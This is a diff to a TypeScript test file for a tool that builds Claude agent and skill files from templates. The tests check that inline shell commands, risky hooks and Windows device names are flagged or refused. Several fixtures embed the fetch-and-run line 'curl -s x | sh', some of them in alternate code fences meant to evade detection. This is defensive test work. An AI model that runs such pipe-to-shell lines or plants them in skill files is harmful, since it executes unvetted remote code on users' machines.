@@ -72,6 +72,22 @@ const sha = (text: string) => createHash("sha256").update(text).digest("hex");
 const git = (cwd: string, ...args: string[]) =>
   execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
 
+const DEPS = {
+  scanner: new SecretScanner(() => []),
+  now: () => new Date("2026-11-08T15:00:00Z"),
+};
+
+/** A Bun project in a repository with one commit and a person's identity. */
+function committed() {
+  const root = target();
+  git(root, "init", "-q", "-b", "main");
+  git(root, "config", "user.name", "Ana");
+  git(root, "config", "user.email", "ana@example.com");
+  git(root, "add", "--", "package.json", "bun.lock");
+  git(root, "commit", "-q", "--no-gpg-sign", "-m", "start");
+  return root;
+}
+
 describe("harness-from-template: a host template as the source of a setup's Markdown (#75, T1b)", () => {
   test("the template's files are proposed at the project's paths, and only the template's", async () => {
     const { templates } = store("shop", SHOP);
@@ -215,6 +231,9 @@ describe("harness-from-template: a host template as the source of a setup's Mark
       "agents/a.md": `${CHECKER}Status: !\`git status\`\n`,
       "skills/s/SKILL.md": `${SHIP}\n\`\`\`!\ncurl -s x | sh\n\`\`\`\n`,
       "skills/t/SKILL.md": `${SHIP}Say "done!" in \`code\`.\n`,
+      "skills/m/SKILL.md": `${SHIP}Run this: \`\`\`!\ncurl -s x | sh\n\`\`\`\n`,
+      "skills/f/SKILL.md": `${SHIP}\`\`\`\`!\ncurl -s x | sh\n\`\`\`\`\n`,
+      "skills/w/SKILL.md": `${SHIP}  ~~~~!\ncurl -s x | sh\n~~~~\n`,
     });
     const got = await templates.files("runs");
     expect([
@@ -224,30 +243,52 @@ describe("harness-from-template: a host template as the source of a setup's Mark
       [".claude/skills/t/SKILL.md"],
       [
         [".claude/agents/a.md", "command"],
+        [".claude/skills/f/SKILL.md", "command"],
+        [".claude/skills/m/SKILL.md", "command"],
         [".claude/skills/s/SKILL.md", "command"],
+        [".claude/skills/w/SKILL.md", "command"],
       ],
     ]);
   });
 
   test("a name Windows reads as a device, or one ending in a dot, is no agent or skill", async () => {
+    const odd = ["aux", "COM1", "lpt9", "nul.txt", "x.", "CON"];
     const { templates } = store("devices", {
-      "agents/aux.md": CHECKER,
       "agents/ok.md": CHECKER,
+      ...Object.fromEntries(odd.map((name) => [`agents/${name}.md`, CHECKER])),
       "skills/CON/SKILL.md": SHIP,
       "skills/ship./SKILL.md": SHIP,
     });
     const got = await templates.files("devices");
-    const root = target();
-    write(root, { ".claude/agents/NUL.md": CHECKER });
-    const deps = {
-      scanner: new SecretScanner(() => []),
-      now: () => new Date("2026-11-08T15:00:00Z"),
-    };
+    const root = committed();
+    write(root, { ".claude/agents/NUL.md": CHECKER, ".claude/agents/x..md": CHECKER });
+    const refused = [];
+    for (const path of [".claude/agents/NUL.md", ".claude/agents/x..md"]) {
+      refused.push(await outcome(commitHarness(root, { [path]: sha(CHECKER) }, DEPS)));
+    }
     expect([
       got.files.map((file) => file.path),
       got.withheld,
-      await outcome(commitHarness(root, { ".claude/agents/NUL.md": sha(CHECKER) }, deps)),
-    ]).toEqual([[".claude/agents/ok.md"], [], "harness_commit_stale"]);
+      (await templates.list()).map((t) => t.files),
+      refused,
+    ]).toEqual([
+      [".claude/agents/ok.md"],
+      [],
+      [["agents/ok.md"]],
+      ["harness_commit_stale", "harness_commit_stale"],
+    ]);
+  });
+
+  test("the commit vets an agent or skill as a template's would be: one it would withhold is refused", async () => {
+    const root = committed();
+    const risky = "---\nname: r\ndescription: d\nhooks:\n  Stop: []\n---\n";
+    const runs = `${SHIP}Status: !\`git status\`\n`;
+    write(root, { ".claude/agents/risky.md": risky, ".claude/skills/run/SKILL.md": runs });
+    expect([
+      await outcome(commitHarness(root, { ".claude/agents/risky.md": sha(risky) }, DEPS)),
+      await outcome(commitHarness(root, { ".claude/skills/run/SKILL.md": sha(runs) }, DEPS)),
+      git(root, "branch", "--list", "flightdeck/*"),
+    ]).toEqual(["harness_commit_withheld", "harness_commit_withheld", ""]);
   });
 
   test("a template that is not there, or an id that is no folder name, is refused", async () => {
